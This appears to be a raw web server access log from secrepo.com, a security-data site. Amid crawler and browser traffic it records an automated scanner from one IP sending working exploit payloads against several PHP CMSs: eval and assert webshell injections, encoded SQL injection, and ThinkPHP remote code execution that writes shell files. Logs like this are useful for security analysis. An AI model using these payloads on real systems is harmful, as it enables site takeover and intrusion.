207.46.13.57 - - [16/Apr/2019:06:21:48 -0700] "GET /self.logs/access.log.2017-06-30.gz HTTP/1.1" 200 51348 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
112.17.236.70 - - [16/Apr/2019:06:22:22 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
112.17.236.70 - - [16/Apr/2019:06:22:23 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
112.17.236.70 - - [16/Apr/2019:06:22:23 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
180.163.220.66 - - [16/Apr/2019:06:22:28 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
112.17.236.70 - - [16/Apr/2019:06:22:28 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 1479 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
112.17.236.70 - - [16/Apr/2019:06:22:29 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/ssl.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
207.46.13.2 - - [16/Apr/2019:06:24:07 -0700] "GET /self.logs/access.log.2019-03-27.gz HTTP/1.1" 200 46445 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
202.180.34.186 - - [16/Apr/2019:06:24:35 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "ICC-Crawler/2.0 (Mozilla-compatible; ; http://ucri.nict.go.jp/en/icccrawler.html)" 
202.180.34.186 - - [16/Apr/2019:06:24:55 -0700] "GET / HTTP/1.1" 200 46413 "-" "ICC-Crawler/2.0 (Mozilla-compatible; ; http://ucri.nict.go.jp/en/icccrawler.html)" 
185.254.168.134 - - [16/Apr/2019:06:28:19 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
185.254.168.134 - - [16/Apr/2019:06:28:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
185.254.168.134 - - [16/Apr/2019:06:28:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
185.254.168.134 - - [16/Apr/2019:06:28:19 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
36.102.6.69 - - [16/Apr/2019:06:28:51 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
40.77.167.92 - - [16/Apr/2019:06:28:56 -0700] "GET /self.logs/2015/error.log.2015-11-22.gz HTTP/1.1" 200 1000 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
123.249.7.34 - - [16/Apr/2019:06:29:44 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:44 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:44 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:45 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:45 -0700] "POST /plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:45 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:46 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:46 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:46 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:47 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:47 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:48 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:48 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=biwpv.php&content=%3C?php%20@assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=biwpv.php&content=<?php @assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:52 -0700] "GET /biwpv.php HTTP/1.1" 404 295 "http://www.secrepo.com/biwpv.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:52 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:52 -0700] "POST /ysyqq.php HTTP/1.1" 404 294 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:53 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=ttnpu.php&vars%5B1%5D%5B%5D=%3C?php%20@assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=ttnpu.php&vars[1][]=<?php @assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:58 -0700] "GET /ttnpu.php HTTP/1.1" 404 295 "http://www.secrepo.com/ttnpu.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:29:59 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:30:00 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 731 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.249.7.34 - - [16/Apr/2019:06:30:01 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 295 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
23.228.159.111 - - [16/Apr/2019:06:33:34 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
23.228.159.111 - - [16/Apr/2019:06:33:35 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
23.228.159.111 - - [16/Apr/2019:06:33:35 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
23.228.159.111 - - [16/Apr/2019:06:33:35 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
23.228.159.111 - - [16/Apr/2019:06:34:58 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 8768872 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
207.46.13.57 - - [16/Apr/2019:06:35:25 -0700] "GET /self.logs/access.log.2018-06-03.gz HTTP/1.1" 200 16377 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
23.228.159.111 - - [16/Apr/2019:06:35:33 -0700] "GET /self.logs/ HTTP/1.1" 200 15931 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
23.228.159.111 - - [16/Apr/2019:06:35:33 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
23.228.159.111 - - [16/Apr/2019:06:35:41 -0700] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17655 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
66.249.83.89 - - [16/Apr/2019:06:36:05 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.83.90 - - [16/Apr/2019:06:36:05 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
40.77.167.92 - - [16/Apr/2019:06:37:23 -0700] "GET /self.logs/2015/error.log.2015-05-27.gz HTTP/1.1" 200 702 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
124.202.183.9 - - [16/Apr/2019:06:37:46 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET / HTTP/1.1" 200 12510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:42:22 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
40.77.167.92 - - [16/Apr/2019:06:43:18 -0700] "GET /self.logs/2016/access.log.2016-01-02.gz HTTP/1.1" 200 5945 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET / HTTP/1.1" 200 12510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
129.173.212.69 - - [16/Apr/2019:06:43:53 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
